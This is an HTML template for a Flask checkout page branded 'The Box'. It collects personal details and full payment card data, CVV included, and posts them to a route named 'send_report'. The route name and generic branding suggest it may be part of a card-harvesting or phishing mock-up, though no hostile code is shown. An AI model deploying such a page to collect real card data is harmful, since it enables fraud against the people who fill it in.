<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checkout - The Box</title>
    <link rel="icon" type="image/png" sizes="16x16" href="static/images/TheBox.png">
    <link rel="icon" type="image/png" sizes="32x32" href="static/images/TheBox.png">
    <link rel="icon" type="image/png" sizes="96x96" href="static/images/TheBox.png">
    <link rel="stylesheet" href="{{ url_for('static', filename='/css/style.css') }}">
</head>
<body>
    <nav class="navbar">
        <div class="logo">The Box</div>
        <ul class="nav-links">
            <li><a href="{{ url_for('index') }}">Login Page</a></li>
            <li><a href="#contact">Contact</a></li>
        </ul>
    </nav>

    <div class="container">
        <h1>Checkout</h1>
        <form id="checkoutForm" action="{{ url_for('send_report') }}" method="POST">
            <div class="form-sections-wrapper">
                <div class="form-section customer-info">
                    <h2>Customer Information</h2>
                    <label for="name">Full Name</label>
                    <input type="text" name="name" id="name" required>

                    <label for="email">Confirm Email</label>
                    <input type="email" name="email" id="email" required>

                    <label for="address">Street Address</label>
                    <input type="text" name="address" id="address" required>

                    <label for="city">City</label>
                    <input type="text" name="city" id="city" required>

                    <label for="region">State/Province/Region (Optional)</label>
                    <input type="text" name="region" id="region">

                    <label for="zip">ZIP Code</label>
                    <input type="text" name="zip" id="zip" required>

                    <label for="country">Country</label>
                    <select name="country" id="country" required>
                        <!-- Add options dynamically -->
                    </select>

                    <label for="phone">Phone Number</label>
                    <input type="tel" name="phone" id="phone" required>

                </div>

                <div class="form-section product-info">
                    <h2>Product Insights</h2>
                    <div id="product-info">
                        <img src="/static/images/firstImage.png" alt="Product Image">
                        <div class="product-details">
                            <!-- Product details will be dynamically loaded here -->
                        </div>
                    </div>
                    <p class="free-shipping">Free Shipping</p>
                    
                    <!-- Snake Animation -->
                    <div class="snake-box">
                        <img src="static/images/hell.jpg" alt="Gift Box" class="snake-gift-box">
                    </div>
                </div>
                
                <div class="form-section payment-info">
                    <h2>Payment Information</h2> 
                    <div class="payment-images">
                        <img src="{{ url_for('static', filename='/images/visa-new-20215093.jpg') }}" alt="Visa">
                        <img src="{{ url_for('static', filename='/images/Mastercard-logo.svg.png') }}" alt="MasterCard">
                    </div>

                    <label for="card_number">Card Number</label>
                    <div class="card-type-container">
                        <input type="text" name="card_number" id="card_number" required>
                        <img id="card-type-image" class="card-type-image" src="" alt="Card Type">
                    </div>

                    <label for="name_on_card">Name on Card</label>
                    <input type="text" name="name_on_card" id="name_on_card" required>

                    <label for="expiry_date">Expiry Date (MM/YY)</label>
                    <input type="text" name="expiry_date" id="expiry_date" required class="short-input">

                    <label for="cvv">CVV</label>
                    <input type="text" name="cvv" id="cvv" required class="short-input">

                    <button type="submit">Pay</button>

                </div>
            </div>
        </form>
    </div>

    <footer id="contact">
        <div>Email: contact@thebox.com</div>
            <div>Phone: +1 (800) 438-4438</div>
    </footer>

    <script src="{{ url_for('static', filename='js/script1.js') }}"></script>
</body>
</html>
